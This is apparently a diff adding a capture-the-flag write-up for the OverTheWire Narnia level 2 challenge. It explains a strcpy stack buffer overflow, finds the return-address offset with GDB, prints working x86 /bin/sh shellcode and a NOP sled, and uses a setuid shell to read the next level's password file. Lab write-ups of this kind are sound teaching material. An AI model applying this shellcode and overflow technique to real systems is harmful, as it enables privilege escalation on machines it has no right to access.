@@ -1,0 +1,139 @@
+//solving narnia 2
+
+narnia2@narnia:~$ ls
+narnia2@narnia:~$ cd /narnia
+narnia2@narnia:/narnia$ ls
+narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
+narnia0.c  narnia2.c  narnia4    narnia5    narnia6.c  narnia8
+narnia1    narnia3.c  narnia4.c  narnia5.c  narnia7    narnia8.c
+narnia2@narnia:/narnia$ cat narnia2.c
+
+The important part of the code is:
+
+char buf[128];
+strcpy(buf, argv[1]);
+
+Here, buf can store only 128 bytes.
+
+strcpy() does not check whether the input is larger than the buffer.
+
+So if we provide more than 128 bytes, the extra data will overwrite the memory after buf on the stack.
+
+narnia2@narnia:/narnia$ ./narnia2
+Usage: ./narnia2 argument
+
+The program expects an argument.
+
+narnia2@narnia:/narnia$ ./narnia2 test
+test
+
+Now we can test for a buffer overflow:
+
+narnia2@narnia:/narnia$ ./narnia2 $(python3 -c 'print("A"*200)')
+
+The program crashes because our input is overflowing the buffer.
+
+Now we use GDB to find where we can control the return address:
+
+narnia2@narnia:/narnia$ gdb ./narnia2
+
+(gdb) break main
+Breakpoint 1 at ...
+
+(gdb) run $(python3 -c 'print("A"*128 + "BBBB" + "CCCC")')
+
+After the crash:
+
+(gdb) info registers
+
+We can see that our input has reached the instruction pointer.
+
+CCCC in hexadecimal is:
+
+C = 0x43
+
+So:
+
+CCCC = 0x43434343
+
+This means that we have control over the saved return address.
+
+The payload structure is:
+
+[padding] + [return address] + [shellcode]
+
+The padding fills the buffer until we reach the saved return address.
+
+The return address tells the program where to continue execution.
+
+We can place shellcode inside the input and overwrite the return address so execution goes to our shellcode.
+
+We can also use a NOP sled:
+
+\x90\x90\x90\x90...
+
+A NOP sled gives us a larger area where execution can land before reaching the shellcode.
+
+The shellcode executes /bin/sh:
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+
+After finding the correct offset and return address with GDB, we provide the final payload.
+
+narnia2@narnia:/narnia$ ./narnia2 $(python3 -c 'print(...)')
+
+If the payload is correct, we get a shell:
+
+$
+
+Now check the user:
+
+$ whoami
+narnia3
+
+Because narnia2 is a setuid binary, the shell runs with the privileges of narnia3.
+
+Now read the password:
+
+$ cat /etc/narnia_pass/narnia3
+
+<password>
+
+Then we can log into the next level:
+
+$ ssh narnia3@narnia.labs.overthewire.org -p 2226
+
+What happened:
+
+argv[1]
+   ↓
+strcpy()
+   ↓
+buf[128]
+   ↓
+buffer overflow
+   ↓
+overwrite saved return address
+   ↓
+control program execution
+   ↓
+execute shellcode
+   ↓
+narnia3 shell
+   ↓
+read /etc/narnia_pass/narnia3
+
+What I learned:
+
+strcpy()
+Buffer Overflow
+Stack
+Saved Return Address
+EIP
+NOP Sled
+Shellcode
+GDB
+Setuid
+Privilege Escalation
+
+Congratulations!!
